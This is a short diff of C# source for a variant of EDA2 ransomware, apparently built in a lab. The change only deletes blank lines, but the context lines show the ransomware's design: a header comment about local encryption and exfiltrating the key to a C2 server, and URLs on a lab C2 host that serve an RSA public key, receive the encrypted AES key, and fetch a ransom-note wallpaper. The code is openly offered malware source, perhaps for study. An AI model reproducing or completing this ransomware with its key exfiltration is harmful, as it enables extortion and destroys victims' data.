@@ -1,5 +1,4 @@
 // EDA2 variant with Local Encryption and key exfil to C2 server
-
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -34,7 +33,6 @@ namespace eda2
         string generatorUrl = "http://c2.lab.local/panel/publickey"; // serves RSA public key
         string keySaveUrl = "http://c2.lab.local/panel/savekey";    // exfils the encrypted AES key
         string backgroundImageUrl = "http://c2.lab.local/panel/ransomnote"; //desktop background ransomnote
-
 
         public Form1()
         {
@@ -261,7 +259,6 @@ namespace eda2
                 SetWallpaper(path);
             }
         }
-
 
     }
 
